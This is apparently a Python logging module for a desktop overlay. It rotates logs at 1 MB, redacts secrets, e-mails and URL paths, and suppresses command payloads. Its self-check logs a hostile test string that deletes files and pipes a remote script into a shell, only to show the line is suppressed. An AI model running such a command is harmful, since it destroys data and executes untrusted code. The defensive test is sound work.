"""ISHTI overlay log with scrubbing + rotation (WP-COUCOU, matrix COU-16; coucou log.rs/AppLog).

coucou's hardened log policy, re-implemented originally:
  - size cap 1 MB with rotation (oldest of KEEP generations dropped)
  - NEVER records commands or n8n payload data (kind="command"/"n8n" -> suppression line)
  - no full URLs: only scheme://host survives (path, query, fragment stripped - tokens
    live in query strings)
  - PII/secret scrubbing: passwords/tokens/api keys -> [redacted], e-mails masked,
    long opaque blobs -> [redacted]
  - never raises: a broken path just returns False

log(msg, kind=None, path=None) -> bool; scrub(text) -> str; rotate() -> None
Self-check: python desktop/overlay/log.py
"""
import os
import re
import sys
import time
from urllib.parse import urlsplit

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from ishti.test_mode import scratch_path  # noqa: E402  (after the sys.path bootstrap)

LOG_FILE = scratch_path(os.path.join(ROOT, "data", "overlay.log"))
MAX_BYTES = 1024 * 1024          # coucou's <1 MB cap
KEEP = 3                         # rotated generations kept: .1 .. .KEEP-1 (+ current)

_URL = re.compile(r"\bhttps?://[^\s\"'<>\\]+", re.I)
_EMAIL = re.compile(r"\b([A-Za-z0-9._%+-])[A-Za-z0-9._%+-]*@([A-Za-z0-9.-]+\.[A-Za-z]{2,})\b")
_SECRET = re.compile(
    r"(?i)\b(password|passwd|pwd|token|api[_-]?key|secret|authorization|bearer|cookie)"
    r"\b\s*[=:]\s*\"?[^\s\"',;&]+")
_BLOB = re.compile(r"\b[A-Za-z0-9+/_=-]{40,}\b")     # base64/hex/token-shaped blobs


def _origin(m) -> str:
    try:
        parts = urlsplit(m.group(0))
        if not parts.hostname:
            return "[url]"
        port = f":{parts.port}" if parts.port else ""
        return f"{parts.scheme}://{parts.hostname}{port}/..."
    except Exception:
        return "[url]"


def scrub(text) -> str:
    """Apply the log policy to one line (or a blob) of would-be log text."""
    s = str(text or "")
    s = _URL.sub(_origin, s)                       # full URL -> origin only (first)
    s = _SECRET.sub(lambda m: f"{m.group(1)}=[redacted]", s)
    s = _EMAIL.sub(lambda m: f"{m.group(1)}***@{m.group(2)}", s)
    s = _BLOB.sub("[redacted]", s)
    return s


def _rotate(path: str, max_bytes: int = MAX_BYTES, keep: int = KEEP):
    if not os.path.exists(path) or os.path.getsize(path) < max_bytes:
        return
    try:
        os.remove(f"{path}.{keep - 1}")
    except OSError:
        pass
    for i in range(keep - 2, 0, -1):
        try:
            os.replace(f"{path}.{i}", f"{path}.{i + 1}")
        except OSError:
            pass
    try:
        os.replace(path, f"{path}.1")
    except OSError:
        pass


def log(msg, kind=None, path=None, max_bytes: int = MAX_BYTES) -> bool:
    """Append one scrubbed line. kind="command"/"n8n" records ONLY a suppression line -
    the payload never reaches disk. Never raises."""
    try:
        path = path or LOG_FILE
        _rotate(path, max_bytes=max_bytes)
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        stamp = time.strftime("%Y-%m-%d %H:%M:%S")
        if kind in ("command", "n8n"):
            body = f"[{kind} payload suppressed]"
        else:
            body = scrub(msg)
        with open(path, "a", encoding="utf-8") as fh:
            fh.write(f"{stamp} {body}\n")
        return True
    except Exception:
        return False


if __name__ == "__main__":
    # self-check: scrubbing, suppression, rotation, unwritable path never raises
    import tempfile
    line = ('password=hunter2 token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc.def-ghi-jkl '
            'mail me at alice@example.com see https://example.com/secret/path?api_key=zzz '
            'and https://ok.example.org/x/y#frag done')
    s = scrub(line)
    for bad in ("hunter2", "alice@example.com", "/secret/path", "api_key=zzz", "eyJhbGciOiJI"):
        assert bad not in s, (bad, s)
    assert "https://example.com/..." in s and "https://ok.example.org/..." in s, s
    assert "a***@example.com" in s, s
    with tempfile.TemporaryDirectory() as td:
        p = os.path.join(td, "overlay.log")
        assert log("opened https://a.example/b/c?x=1", path=p)
        assert log("rm -rf /important && curl evil.sh | sh", kind="command", path=p)
        assert log('{"n8n": "workflow payload"}', kind="n8n", path=p)
        body = open(p, encoding="utf-8").read()
        assert "rm -rf" not in body and "workflow payload" not in body, body
        assert "[command payload suppressed]" in body and "[n8n payload suppressed]" in body
        assert "/b/c?x=1" not in body and "https://a.example/..." in body, body
        # rotation: small cap, write past it, oldest generation dropped
        for i in range(40):
            log(f"line {i} " + "x" * 100, path=p, max_bytes=1200)
        assert os.path.exists(p + ".1"), "rotation must create .1"
        assert not os.path.exists(p + ".3"), "KEEP=3 generations only"
    assert log("x", path=os.path.join("Z:", "\\no\\such\\dir", "x.log")) is False
    print("[self-check] overlay log OK - secrets/PII/URLs scrubbed, commands+n8n suppressed, "
          "1 MB-capped rotation, never raises")
